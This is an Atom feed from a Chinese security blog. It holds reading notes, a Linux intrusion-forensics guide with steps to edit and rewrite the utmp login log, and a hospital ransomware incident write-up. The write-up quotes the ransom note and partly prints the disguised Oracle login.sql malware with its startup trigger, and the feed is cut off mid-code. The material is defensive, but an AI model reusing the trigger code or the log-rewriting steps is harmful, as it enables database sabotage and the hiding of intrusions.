<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>凉城Lc</title>
  <icon>https://www.gravatar.com/avatar/3af0be4ed9ad6fd6cc67a6b0671e7d32</icon>
  <subtitle>真正的不自由，是在自己的心中设下牢笼</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://airs-sec.com/"/>
  <updated>2018-07-09T06:56:23.246Z</updated>
  <id>http://airs-sec.com/</id>
  
  <author>
    <name>凉城Lc</name>
    <email>ledaiye@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://airs-sec.com/2018/07/09/hello-world/"/>
    <id>http://airs-sec.com/2018/07/09/hello-world/</id>
    <published>2018-07-09T05:27:48.605Z</published>
    <updated>2018-07-09T06:56:23.246Z</updated>
    
    <content type="html"><![CDATA[<p>换了一个主题，地址：<a href="https://gitee.com/shenweiyan/hexo-theme-BlueLake" target="_blank" rel="noopener">https://gitee.com/shenweiyan/hexo-theme-BlueLake</a></p><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;换了一个主题，地址：&lt;a href=&quot;https://gitee.com/shenweiyan/hexo-theme-BlueLake&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://gitee.com/shenweiyan/hexo-theme-BlueLake&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>黑客与画家-三-不能说的话</title>
    <link href="http://airs-sec.com/2018/05/13/%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6-%E4%B8%89-%E4%B8%8D%E8%83%BD%E8%AF%B4%E7%9A%84%E8%AF%9D/"/>
    <id>http://airs-sec.com/2018/05/13/黑客与画家-三-不能说的话/</id>
    <published>2018-05-13T11:27:55.000Z</published>
    <updated>2018-07-09T06:58:29.851Z</updated>
    
    <content type="html"><![CDATA[<ul><li>明明是专横武断、毫无依据的错误观点，但是大多数人却深信不疑，受到影响而不自知。<ul><li><strong>你是一个随大流的人吗？</strong></li><li>一种可能是，也许事情并没有这么巧合，你的观点就是从别人那里听来的，别人告诉你什么，你就相信了什么，你把别人灌输的观点当作了自己的观点。</li><li>与历史上别的年代一样，我们的思想几乎肯定也是一张有错误的地图。</li><li>如果别人告诉你应该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。</li></ul></li></ul><a id="more"></a><ul><li><p><strong>真话</strong></p><ul><li>触怒他人的言论是那些可能会有人相信的言论。</li></ul></li><li><strong>异端学说</strong></li><li><strong>时空差异</strong></li><li><strong>道貌岸然</strong><ul><li>因为他们觉得孩子不应该知道成年人语言的所有内容，只需知道一部分适合儿童的词就行了。我们喜欢孩子们看上去天真无邪。</li><li>他的头脑或多或少是纯洁无瑕的，一点也不知道哪些“不能说的话”，从来没有被真实的社会生活“污染”过。</li><li>. 孩子眼里的世界是不真实的，是一个被灌输进他们头脑的假想世界。</li></ul></li><li><strong>机制</strong><ul><li><ol><li>如果一个团体强大到无比自信，它根本不会在乎别人的抨击。</li></ol></li></ul></li><li><strong>为什么这么做</strong><ul><li>智力越高的人，越愿意去思考那些惊世骇俗的思想观点。</li><li>做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势。</li><li>训练自己去想那些不能想的事情，你获得的好处会超过所得到的想法本身。</li></ul></li><li><strong>守口如瓶</strong><ul><li><ol><li>与笨蛋辩论，你也会变成笨蛋。</li></ol></li><li>自由思考比畅所欲言更重要。</li></ul></li><li><strong>笑脸相迎？</strong></li><li><strong>永远质疑</strong><ul><li>时间就是一种产生距离的简单方法。</li><li>如果你想要清晰地思考，就必须远离人群。</li><li>小时候，每个人都会鼓励你不断成长，变成一个心智成熟、不再耍小孩子脾气的人。但是，很少有人鼓励你继续成长，变成一个怀疑和抵制社会错误潮流的人。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;明明是专横武断、毫无依据的错误观点，但是大多数人却深信不疑，受到影响而不自知。&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;你是一个随大流的人吗？&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;一种可能是，也许事情并没有这么巧合，你的观点就是从别人那里听来的，别人告诉你什么，你就相信了什么，你把别人灌输的观点当作了自己的观点。&lt;/li&gt;
&lt;li&gt;与历史上别的年代一样，我们的思想几乎肯定也是一张有错误的地图。&lt;/li&gt;
&lt;li&gt;如果别人告诉你应该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>linux取证分析</title>
    <link href="http://airs-sec.com/2018/04/20/linux%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/"/>
    <id>http://airs-sec.com/2018/04/20/linux取证分析/</id>
    <published>2018-04-20T09:16:55.000Z</published>
    <updated>2018-04-20T09:19:26.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux取证分析"><a href="#linux取证分析" class="headerlink" title="linux取证分析"></a>linux取证分析</h1><p>@(C1-linux)</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/wallhaven-640380.jpg" alt="enter description here" title="wallhaven-640380"></p><blockquote><p>如果linux系统遭到了入侵，怎样对linux进行入侵分析呢？在分析阶段，熟悉linux下工具的使用非常重要，主要包括了日志文件、异常进程排查、异常文件分析等。</p></blockquote><a id="more"></a><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># w</span></span><br><span class="line"><span class="comment"># 显示当前登录系统的所有用户</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-18_21-57-03.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># lastlog</span></span><br><span class="line"><span class="comment"># 显示最近登录操作系统的所有用户，引用/var/log/lastlog二进制文件中的信息</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-18_22-05-13.png" alt="2"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  last</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出当前和曾经登入系统的用户信息，它默认读取的是/var/log/wtmp文件的信息。</span></span><br><span class="line"><span class="comment"># 输出的内容包括：用户名、终端位置、登录源信息、开始时间、结束时间、持续时间。</span></span><br><span class="line"><span class="comment">#注意最后一行输出的是wtmp文件起始记录的时间。当然也可以通过last -f参数指定读取文件，可以是/var/log/btmp、/var/run/utmp</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-18_22-02-16.png" alt="3"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lastb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看登录失败的用户,默认读取的是/var/log/btmp中文件的信息</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_14-40-46.png" alt="5"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示当前登录用户的信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># who</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_14-47-15.png" alt="6"></p><hr><p><strong>二进制文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/run/utmp：记录当前正在登录系统的用户信息，默认由who和w记录当前登录用户的信息，uptime记录系统启动时间；</span><br><span class="line"></span><br><span class="line">/var/log/wtmp：记录当前正在登录和历史登录系统的用户信息，默认由last命令查看；</span><br><span class="line"></span><br><span class="line">/var/log/btmp：记录失败的登录尝试信息，默认由lastb命令查看。</span><br></pre></td></tr></table></figure><p><strong>如何查看二进制文件的内容</strong></p><blockquote><p>1、xxd</p></blockquote><p>xdd /var/log/wtmp</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_14-03-15.png" alt="4"></p><blockquote><p>2、last -f /var/log/wtmp,同样可以查看<code>/var/log/*tmp</code>文件中的内容</p></blockquote><blockquote><p>3、utmpdump(推荐)</p></blockquote><blockquote><p>3.1 utmpdump [options] filename</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_16-00-23.png" alt="7"></p><blockquote><p>输出格式说明</p></blockquote><ul><li>1、显示会话识别符</li><li>2、PID</li><li>3、以下值：<ul><li>– ： 运行等级改变/重启</li><li>bw ： 启动守护进程</li><li>数字： 表示tty号</li></ul></li><li>4、可为空/用户名/重启/运行级别</li><li>5、主tty/pty(伪终端)</li><li>6、远程主机名(本地登录为空，返回内核版本)</li><li>7、远程系统的IP地址(本地为0.0.0.0)</li><li>8、该记录创建的日期和时间</li></ul><p>在/var/log/wtmp中，会话标识符为1的代表一次新的登录时间的特征，会话标识符8表示登出事件的特征。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 输出特定的字段</span><br><span class="line"></span><br><span class="line"># utmpdump /var/log/wtmp | grep -E &quot;\[7].*airs&quot; | awk -v OFS=&quot;,&quot; &apos;BEGIN &#123;FS=&quot;]&quot;&#125;;&#123;print $2,$4,$7,$8&#125;&apos; | sed -e &apos;s/\[//g&apos; -e &apos;s/\]//g&apos;</span><br></pre></td></tr></table></figure><blockquote><p>3.2 修改utmp或wtmp等二进制文件</p></blockquote><ul><li><code># utmpdump /var/log/utmp &gt; tmp_output</code></li><li><code>&lt;使用文本编辑器修改 tmp_output&gt;</code></li><li><code># utmpdump -r tmp_output &gt; /var/log/utmp</code></li></ul><hr><p><strong>查完了用户登录之后，查看流量和进程相关的情况：</strong></p><p>流量：</p><blockquote><p>top</p></blockquote><blockquote><p>iftop</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-21_23-55-11.png" alt="0"></p><blockquote><p>nethogs</p></blockquote><p>安装nethogs：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install nethogs</span><br><span class="line"></span><br><span class="line">apt-get install nethogs</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-21_23-58-28.png" alt="10"></p><p>上图中的PID为3248和3218的进程存在问题，直接查看进程ID号，进程相关的东西都存放在/proc/PID下。</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_00-04-11.png" alt="11"></p><p>利用strace对PID进行追踪。</p><blockquote><p><code>strace -tt -p 3218</code></p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_00-10-20.png" alt="12"></p><p>进程：</p><p>注意UID为0的进程</p><blockquote><p>ps -ef</p></blockquote><p>检查隐藏进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ps -ef | awk &apos;&#123;print &#125;&apos; | sort -n | uniq &gt;1</span><br><span class="line"></span><br><span class="line"># ls /porc |sort -n|uniq &gt;2</span><br><span class="line"></span><br><span class="line"># diff 1 2</span><br></pre></td></tr></table></figure><blockquote><p>lsof -p PID</p></blockquote><p>查看该进程所有打开的文件</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_00-18-10.png" alt="12"></p><blockquote><p>lsof -i</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">dhclient  2970 root    6u  IPv4  25819      0t0  UDP *:bootpc</span><br><span class="line">udisks-da 3218 root    3u  IPv4  35724      0t0  TCP localhost:42070-&gt;122.224.32.32:6009 (SYN_SENT)</span><br><span class="line">udisks-da 3248 root    3u  IPv4  37848      0t0  TCP localhost:42072-&gt;122.224.32.32:6009 (SYN_SENT)</span><br></pre></td></tr></table></figure><blockquote><p>netstat -tlunp</p></blockquote><p>检查系统后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># cat /etc/crontab</span><br><span class="line"># ls /var/spool/cron/</span><br><span class="line"># cat /etc/rc.d/rc.local</span><br><span class="line"># ls /etc/rc.d</span><br><span class="line"># ls /etc/rc3.d</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_15-48-27.png" alt="132"></p><p><a href="https://www.cnblogs.com/kevingrace/p/5895116.html" target="_blank" rel="noopener">更多查看</a></p><hr><h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><blockquote><p>strace命令是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说gdb之类的是没法相比的，因为它不是一个专业的调试器。</p></blockquote><p><a href="http://man.linuxde.net/strace" target="_blank" rel="noopener">strace具体用法</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file ./udisks-daemon</span></span><br><span class="line">./udisks-daemon: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.4, not stripped</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-21_23-23-40.png" alt="9"></p><p>来自：<a href="https://www.anquanke.com/post/id/82796" target="_blank" rel="noopener">https://www.anquanke.com/post/id/82796</a></p><p>是一种病毒文件，对病毒文件进行跟踪，发现连接的ip及端口。</p><p><img src="http://obgutsg63.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720180121231637.jpg" alt="8"></p><hr><p>病毒扫描</p><p>ClamAV</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-23_11-33-13.png" alt="13"></p><p>1、安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># yum install -y epel-release</span><br><span class="line"></span><br><span class="line"># yum install -y clamav</span><br></pre></td></tr></table></figure><p>2、更新病毒库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo freshclam</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-23_11-41-02.png" alt="14"></p><p>3、如何使用</p><p>clamav扫描使用clamavscan命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">扫描所有用户的主目录:clamavscan -r /home</span><br><span class="line"></span><br><span class="line">扫描根目录：clamav -r /</span><br><span class="line"></span><br><span class="line">扫描服务器上的所有文件并显示有问题的文件：clamav -r --bell -i /</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/20180123114918.png" alt="14"></p><p><img src="http://obgutsg63.bkt.clouddn.com/20180123115011.png" alt="15"></p><p><img src="http://obgutsg63.bkt.clouddn.com/20180123115207.png" alt="16"></p><p><a href="http://www.clamav.net" target="_blank" rel="noopener">ClamAV官网</a></p><p><a href="http://wiki.ubuntu.org.cn/ClamAV" target="_blank" rel="noopener">ClamAV_HELP</a></p><hr><p>参考：</p><p><a href="http://www.linuxidc.com/Linux/2014-11/109361.htm" target="_blank" rel="noopener">使用 utmpdump 监控 CentOS 用户登录历史</a></p><p><a href="https://www.cnblogs.com/lizhaoxian/p/5981029.html" target="_blank" rel="noopener">Linux用户登录记录日志和相关查看命令汇总</a></p><p><a href="https://bash-prompt.net/guides/server-hacked/" target="_blank" rel="noopener">How To Tell If Your Linux Server Has Been Compromised</a></p><p><a href="https://www.cnblogs.com/kerrycode/p/4754820.html" target="_blank" rel="noopener">https://www.cnblogs.com/kerrycode/p/4754820.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;linux取证分析&quot;&gt;&lt;a href=&quot;#linux取证分析&quot; class=&quot;headerlink&quot; title=&quot;linux取证分析&quot;&gt;&lt;/a&gt;linux取证分析&lt;/h1&gt;&lt;p&gt;@(C1-linux)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/wallhaven-640380.jpg&quot; alt=&quot;enter description here&quot; title=&quot;wallhaven-640380&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果linux系统遭到了入侵，怎样对linux进行入侵分析呢？在分析阶段，熟悉linux下工具的使用非常重要，主要包括了日志文件、异常进程排查、异常文件分析等。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="linux" scheme="http://airs-sec.com/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次某医院勒索软件事件处理整理</title>
    <link href="http://airs-sec.com/2018/03/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E5%8C%BB%E9%99%A2%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%95%B4%E7%90%86/"/>
    <id>http://airs-sec.com/2018/03/01/记一次某医院勒索软件事件处理整理/</id>
    <published>2018-03-01T06:35:13.000Z</published>
    <updated>2018-03-01T06:41:33.224Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/1519886469360.jpg" alt="enter description here"></p><a id="more"></a><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><blockquote><p>2018年的某天，公司接到某医院的电话，医院的后台和终端机出现数据库异常报错情况。</p></blockquote><blockquote><p>基于这种紧急情况，公司立马出动应急人员，赶到客户现场。</p></blockquote><blockquote><p>到现场，初步了解情况之后，通过沟通以及对报错信息进行分析，后台报错如下<code>（你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.）</code>，初步判断为<code>Ransom_RUSHQL.A</code>勒索病毒。这种病毒针对oracle数据库，通过一定的条件触发，并最终锁死数据库，从而引发数据库宕机。</p></blockquote><blockquote><p>由于是生成库，所以我们最终需要做的就是处理掉病毒，对数据进行恢复。</p></blockquote><p><strong>病毒如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">-- Copyright (c) 1988, 2011, Oracle and/or its affiliates. </span><br><span class="line">-- All rights reserved. </span><br><span class="line">--</span><br><span class="line">-- NAME</span><br><span class="line">--   login.sql</span><br><span class="line">--</span><br><span class="line">-- DESCRIPTION</span><br><span class="line">--   PL/SQL global login &quot;site profile&quot; file</span><br><span class="line">--</span><br><span class="line">--   Add any PL/SQL commands here that are to be executed when a</span><br><span class="line">--   user starts PL/SQL, or uses the PL/SQL CONNECT command.</span><br><span class="line">--</span><br><span class="line">-- USAGE</span><br><span class="line">--   This script is automatically run</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">..............此处为恶意软件混淆的官方声明,非官方声明......................</span><br><span class="line"></span><br><span class="line">-- This SQL was created by Oracle ; You should never remove/delete it!</span><br><span class="line"></span><br><span class="line">--     MODIFIED   (MM/DD/YY)</span><br><span class="line">--     esoyleme   02/27/02 - remove xumuts.plb</span><br><span class="line">--     rburns     02/20/02 - re-validate catalog</span><br><span class="line">--     rburns     02/11/02 - add registry version</span><br><span class="line">--     rpang      01/25/02 - add UTL_GDK</span><br><span class="line">--     esoyleme   01/23/02 - bring in changes from oraolap</span><br><span class="line"></span><br><span class="line">..............此处内容过多，省略......................</span><br><span class="line">            </span><br><span class="line">--     akruglik   05/06/98 -  add tabfragobj# to lobfrag$ and </span><br><span class="line">--                            tabpartobj# to lobcomppart$</span><br><span class="line">--     nagarwal   05/02/98 -  create indexes on operator catalogs</span><br><span class="line">--     akruglik   05/01/98 -  add defbufpool to PARTLOB$ and LOBCOMPPART$       </span><br><span class="line">--     syeung     04/27/98 -  remove type# from tabcompart$ and indcompart$ and</span><br><span class="line">--                            make deflists and defgroups nullable</span><br><span class="line"></span><br><span class="line">create or replace procedure &quot;DBMS_SUPPORT_INTERNAL         &quot; wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">6f2 467</span><br><span class="line">..........对加密数据进行省略..............</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">PROMPT Create &quot;DBMS_SUPPORT_INTERNAL         &quot;</span><br><span class="line">create or replace trigger &quot;DBMS_SUPPORT_INTERNAL         &quot;</span><br><span class="line">after startup on database </span><br><span class="line">begin</span><br><span class="line"> &quot;DBMS_SUPPORT_INTERNAL         &quot;;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE procedure  &quot;DBMS_SYSTEM_INTERNAL         &quot; wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">3a5 384</span><br><span class="line">..........对加密数据进行省略..............</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE TRIGGER 